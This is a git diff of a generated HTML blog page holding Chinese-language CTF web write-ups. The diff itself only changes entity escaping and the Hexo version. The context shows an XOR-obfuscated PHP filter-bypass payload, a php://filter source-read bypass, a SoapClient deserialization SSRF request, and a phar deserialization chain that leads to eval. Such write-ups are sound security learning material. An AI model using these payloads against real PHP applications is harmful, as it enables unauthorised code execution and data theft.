@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
@@ -381,9 +381,9 @@
 <p>paylaod:<code>((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));</code>但是里面的字符类型超过13了</p>
 <p>利用已经存在的字符异或来替换减少字符类型</p>
 <p>查找可以替换的字符</p>
-<p>a = c^p^r </p>
-<p>d = s^c^t </p>
-<p>n = i^s^t</p>
+<p>a &#x3D; c^p^r </p>
+<p>d &#x3D; s^c^t </p>
+<p>n &#x3D; i^s^t</p>
 <p>每个替换字符再与%ff异或一下</p>
 <p>得到：</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586916100-cb946524-270b-4b18-a5bc-5f0df59a7c1f.png" alt="img"></p>
@@ -432,7 +432,7 @@
 <p>可以借助一个demo来理解</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689743421112-e924c505-196c-450c-8811-58f86831aa55.png" alt="img"></p>
 <p> parse_url()会把<code>//</code>认为是相对路径 </p>
-<p>于是当我们在路径前多输入一个/，会使这个函数失效，这样就绕过了检测  </p>
+<p>于是当我们在路径前多输入一个&#x2F;，会使这个函数失效，这样就绕过了检测  </p>
 <p>如果我们直接输入<code>/user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</code>会被检测</p>
 <p>但是在前面多加一个<code>/</code>成功读到了源码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</span><br><span class="line">&lt;?php</span><br><span class="line">if (FLAG_SIG != 1)&#123;</span><br><span class="line">    die(&quot;you can not visit it directly&quot;);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    echo &quot;you can find sth in m4aaannngggeee&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -456,7 +456,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user.php?page=m4aaannngggeee</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742213512-efa5426d-7232-415f-bca5-7372374dc56a.png" alt="img"></p>
-<p>由于不能让move_uploaded_file报错，文件名里不能有/这种路径字符  </p>
+<p>由于不能让move_uploaded_file报错，文件名里不能有&#x2F;这种路径字符  </p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_">is_uploaded_file</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_">move_uploaded_file</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$path.<span class="property">$filename</span>))&#123;</span><br><span class="line">        <span class="title function_">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>所以如果我们执行命令 <code>ls /</code>这样 那么就会die出去 没有回显 难怪我一开始一直在这里困惑 </p>
@@ -553,8 +553,8 @@
 <p>来分析一下index.php</p>
 <h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>首先是一个call_user_func() 第一个参数作为回调函数执行 第二个参数作为回调函数的参数传入</p>
 <p>但是这里一开始我在想为什么不直接通过system()当回调函数 直接进行命令执行 </p>
-<p>后来发现$_POST只能以键值 也就是A=B的形式传入才行 </p>
-<p>只传入一个A是post不上去的 所以A=B的形式肯定不符合call_user_func()第二个参数无果</p>
+<p>后来发现$_POST只能以键值 也就是A&#x3D;B的形式传入才行 </p>
+<p>只传入一个A是post不上去的 所以A&#x3D;B的形式肯定不符合call_user_func()第二个参数无果</p>
 <p>除此之外 这个函数不仅仅只能传入函数 还可以通过数组包含类的方式执行类的方法</p>
 <p>如下：</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689863056915-faa2b80d-4893-41f9-afaa-78862cad8a45.png" alt="img"></p>
@@ -590,7 +590,7 @@
 <p>本题的思路：</p>
 <p>利用回调函数覆盖session序列化引擎为php_serilaze  在代码中这样<code>session_start(serialize_hander=php_serialize)</code>  可以查php手册能这样修改  一开始问gpt说不能这样 着实是被误导了</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689867197838-9f5e2a67-85ef-4ab1-80ab-409e4fab2459.png" alt="img"></p>
-<p>构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件 文件名要用phpsessid=8位自己设置一下</p>
+<p>构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件 文件名要用phpsessid&#x3D;8位自己设置一下</p>
 <p>利用变量覆盖漏洞，用extract()覆盖掉变量b为回调函数call_user_func，回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可。</p>
 <p>请求包：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?f=session_start&amp;name=|O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D HTTP/<span class="number">1.1</span></span><br><span class="line">Host: b409417f-d781-<span class="number">4e26</span>-ae3a-<span class="number">96e176</span>b88d1a.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; PHPSESSID=aaaaaaaa</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 31</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">serialize_handler=php_serialize</span></span><br></pre></td></tr></table></figure>
@@ -648,7 +648,7 @@
 <p>一下demo简单理解</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689921829164-36d8fada-eb71-4646-8c59-c4ba49d8b785.png" alt="img"></p>
 <h1 id="124、-GXYCTF2019-BabysqliV3-0"><a href="#124、-GXYCTF2019-BabysqliV3-0" class="headerlink" title="124、[GXYCTF2019]BabysqliV3.0"></a>124、[GXYCTF2019]BabysqliV3.0</h1><p>这道题目看标题以为是sql注入 但是其实预期解是phar反序列化 最重要的是代码审计</p>
-<p>弱口令 admin/password</p>
+<p>弱口令 admin&#x2F;password</p>
 <p>看url 很奇怪 感觉存在任意文件读取</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home.php?file=php://filter/read=convert.base64-encode/resource=upload</span><br></pre></td></tr></table></figure>
 
@@ -681,7 +681,7 @@
 
 <p>还剩两个魔术方法</p>
 <p>可以看到析构函数 存在eval 执行cmd属性 但是这个题目不存在反序列化入口函数</p>
-<p>但是这个题目有文件上传啊 太经典了 phar文件搭配phar://就可以进行反序列化</p>
+<p>但是这个题目有文件上传啊 太经典了 phar文件搭配phar:&#x2F;&#x2F;就可以进行反序列化</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">        <span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>ok 思路清晰！</p>
@@ -701,7 +701,7 @@
 <p>然后就是很经典的phar链子构造 偷的</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>-&gt;Filename=<span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>-&gt;cmd=<span class="string">&quot;highlight_file(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>-&gt;token=<span class="string">&quot;GXY845d6439be6936948e31cbfbbc90a715&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
 
-<p>上传上去之后 在用phar://去访问就行了 这里就不赘述了</p>
+<p>上传上去之后 在用phar:&#x2F;&#x2F;去访问就行了 这里就不赘述了</p>
 <p>然后这道题目过滤里有个错误</p>
 <p> <code>if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;]))</code></p>
 <p>仔细看<code>\.</code>前面有个空格 所以这道题匹配不到我们的<code>.</code>因而我们才能get的name中存在<code>.</code></p>
